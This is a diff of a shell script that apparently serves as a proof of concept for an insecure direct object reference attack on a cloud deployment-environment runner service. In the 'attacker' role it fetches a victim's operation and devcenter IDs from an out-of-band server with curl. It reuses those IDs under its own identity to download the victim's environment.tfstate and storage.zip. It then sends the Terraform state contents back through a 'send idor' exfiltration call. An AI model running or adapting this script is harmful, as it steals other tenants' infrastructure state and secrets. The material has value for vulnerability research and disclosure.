@@ -32,26 +32,26 @@ if [ "$ROLE" = "victim" ]; then
 fi
 
 if [ "$ROLE" = "attacker" ]; then
-  send abaseline "own_op=$ADE_HTTP__OPERATIONID own_dcid=$ADE_HTTP__DEVCENTERID own_endpoint=$ADE_HTTP__ENDPOINT"
-  # Fetch the target environment's live capability ids at runtime (so launches can be concurrent).
-  for attempt in $(seq 1 18); do
+  send abaseline "own_op=$ADE_HTTP__OPERATIONID own_pet_mi=$ARM_CLIENT_ID endpoint=$ADE_HTTP__ENDPOINT"
+  for attempt in $(seq 1 24); do
     if [ -z "$TARGET_OP" ] && [ -n "$OOB" ]; then
       J="$(curl -s -m 15 "$OOB/currentvictim" 2>/dev/null)"
-      TARGET_OP="$(echo "$J" | sed -n 's/.*"victim_op": *"\([^"]*\)".*/\1/p')"
+      TARGET_OP="$(echo "$J" | grep -oE '"victim_op": *"[0-9a-fA-F-]{36}"' | grep -oE '[0-9a-fA-F-]{36}')"
       TARGET_DCID="$(echo "$J" | sed -n 's/.*"victim_dcid": *"\([^"]*\)".*/\1/p')"
       TGT_EP="$(echo "$J" | sed -n 's/.*"victim_endpoint": *"\([^"]*\)".*/\1/p')"
     fi
-    if [ -z "$TARGET_OP" ]; then sleep 15; continue; fi
-    mkdir -p /tmp/x; rm -f /tmp/x/* 2>/dev/null
+    if [ -z "$TARGET_OP" ]; then send astatus "attempt=$attempt no-target-yet raw=[$J]"; sleep 15; continue; fi
+    mkdir -p /tmp/x; rm -f /tmp/x/environment.tfstate /tmp/x/storage.zip 2>/dev/null
     # Present the TARGET environment's live capability ids while authenticated as THIS runner's
     # (different) deployment identity, addressing the real regional Runner-Management gateway.
     L="$(ADE_HTTP__OPERATIONID="$TARGET_OP" ADE_HTTP__DEVCENTERID="${TARGET_DCID:-$ADE_HTTP__DEVCENTERID}" ADE_HTTP__ENDPOINT="${TGT_EP:-$ADE_HTTP__ENDPOINT}" $ADE files list 2>&1)"
     ADE_HTTP__OPERATIONID="$TARGET_OP" ADE_HTTP__DEVCENTERID="${TARGET_DCID:-$ADE_HTTP__DEVCENTERID}" ADE_HTTP__ENDPOINT="${TGT_EP:-$ADE_HTTP__ENDPOINT}" \
       $ADE files download --file-name storage.zip --folder-path /tmp/x --unzip >/tmp/x/dl.txt 2>&1
-    rc=$?
-    if [ -f /tmp/x/environment.tfstate ] || echo "$L" | grep -q storage.zip || [ "$attempt" -ge 18 ]; then
-      send idor "$(echo "## attempt=$attempt own_pet_mi=$ARM_CLIENT_ID"; echo "## target_op=$TARGET_OP target_dcid=$TARGET_DCID"; echo '## files list:'; echo "$L"; echo "## download rc=$rc:"; cat /tmp/x/dl.txt; echo '## dir:'; ls -laR /tmp/x 2>&1; echo '## TARGET tfstate (head):'; head -c 9000 /tmp/x/environment.tfstate 2>&1)"
-      [ -f /tmp/x/environment.tfstate ] && break
+    if [ -f /tmp/x/environment.tfstate ]; then
+      send idor "$(echo "## SUCCESS attempt=$attempt own_pet_mi=$ARM_CLIENT_ID"; echo "## target_op=$TARGET_OP target_dcid=$TARGET_DCID"; echo '## files list:'; echo "$L"; echo '## TARGET tfstate (head):'; head -c 9000 /tmp/x/environment.tfstate 2>&1)"
+      break
+    else
+      send astatus "$(echo "## FAIL attempt=$attempt own_pet_mi=$ARM_CLIENT_ID target_op=$TARGET_OP"; echo '## list:'; echo "$L"; echo '## dl:'; head -c 400 /tmp/x/dl.txt 2>&1)"
     fi
     sleep 20
   done
